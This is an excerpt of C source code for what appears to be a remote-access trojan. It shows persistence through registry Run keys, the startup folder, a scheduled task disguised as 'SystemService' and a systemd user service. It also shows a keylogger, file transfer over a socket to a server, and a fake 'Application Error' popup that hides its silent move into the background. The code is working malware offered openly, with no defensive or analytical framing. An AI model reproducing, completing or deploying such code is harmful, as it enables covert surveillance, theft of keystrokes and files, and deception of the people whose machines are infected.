...
// In socket_receive_file function
void socket_receive_file(const char *filepath) {
    if (server_socket_fd == INVALID_FD) {
        return;
    }
...
// Now implement the persist_command function with the -A flag
void persist_command(char **args) {
    ...
    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
        ...
        RegCloseKey(hKey);
        printf("[+] Added to registry startup\n");
    }
    ...
    if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_path) == S_OK) {
        ...
        if (CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, 
            ...
            if (psl->lpVtbl->QueryInterface(psl, &IID_IPersistFile, (LPVOID*)&ppf) == S_OK) {
                ...
                printf("[+] Added to startup folder\n");
            }
    ...
    if (isAdmin) {
        ...
        snprintf(task_cmd, sizeof(task_cmd), "schtasks /create /tn \"SystemService\" /tr \"\\\"%s\\\" --minimized\" /sc onlogon /rl highest /f", hidden_exe);
        if (system(task_cmd) == 0) {
            printf("[+] Scheduled task with admin privileges\n");
        } else {
            printf("[-] Failed to schedule admin task\n");
        }
    } else {
        // Try without admin privileges
        snprintf(task_cmd, sizeof(task_cmd), "schtasks /create /tn \"SystemService\" /tr \"\\\"%s\\\" --minimized\" /sc onlogon /f", hidden_exe);
        if (system(task_cmd) == 0) {
            printf("[+] Scheduled task without admin privileges\n");
        } else {
    ...
    if (service_file) {
        ...
        if (system(cmd) == 0) {
            printf("[+] Created and enabled systemd user service\n");
        } else {
...
void change_directory(char **args) {
    ...
    if (getcwd(current_dir, sizeof(current_dir)) != NULL) {
        // Only print locally if not connected to server
        if (!connected_to_server) {
...
// In print_working_directory function
void print_working_directory(char **args) {
    // Only print locally if not connected to server
    if (!connected_to_server) {
        printf("%s\n", current_dir);
...
void keylogger(char **args) {
    ...
    char keystrokes_dir[MAX_PATH_LENGTH];
    snprintf(keystrokes_dir, sizeof(keystrokes_dir), "%s/keystrokes", output_dir);
    
    // Ensure the directory exists
#ifdef _WIN32
    if (_mkdir(keystrokes_dir) != 0 && errno != EEXIST) {
        printf("Failed to create keystrokes directory: %s\n", keystrokes_dir);
        keylogger_active = 0;
        return;
    }
#else
    if (mkdir(keystrokes_dir, 0755) != 0 && errno != EEXIST) {
        printf("Failed to create keystrokes directory: %s\n", keystrokes_dir);
        keylogger_active = 0;
        return;
    }
...
int main(int argc, char *argv[]) {
    ...
    char hostname[256];
#ifdef _WIN32
    // Initialize Winsock for socket connections
    WSADATA wsaData;
    ...
    CoInitialize(NULL);
#else
    // Only initialize HTTP if NOT running in background mode
    // Background mode will initialize after daemonization
    if (!background_mode) {
        init_http();
    }
#endif
    ...
    if (background_mode) {
        ...
        // Check if we should show the error popup
        if (show_error_popup) {
            // Show fake error and switch to background mode
            #ifdef _WIN32
                // DO NOT free console yet - keep it for message box
                // Show the error message with a visible parent
                ...
                MessageBoxA(hwnd,
                           "The application failed to initialize properly (0x000008).\n\n"
                           "Click OK to close the application.",
                           "Application Error",
                           MB_OK | MB_ICONERROR | MB_TOPMOST | MB_SETFOREGROUND | MB_TASKMODAL);
                
                // Additional delay after user clicks OK
                Sleep(500);
            #else
                // Try different methods to show error on Linux
                if (system("command -v zenity >/dev/null 2>&1") == 0) {
                    system("zenity --error --text='Application error 0x000008\\nThe application failed to initialize properly.' --title='Application Error' 2>/dev/null");
                } else if (system("command -v xmessage >/dev/null 2>&1") == 0) {
                    system("xmessage -center 'Application Error\\n\\nThe application failed to initialize properly (0x000008).' 2>/dev/null");
                } else if (system("command -v kdialog >/dev/null 2>&1") == 0) {
                    system("kdialog --error 'Application error 0x000008\\nThe application failed to initialize properly.' 2>/dev/null");
                }
                sleep(2);
            #endif
        }
        
        // After showing error (or not), run in background
        background_mode = 1;
        run_in_background();
        // This function never returns
        return 0;
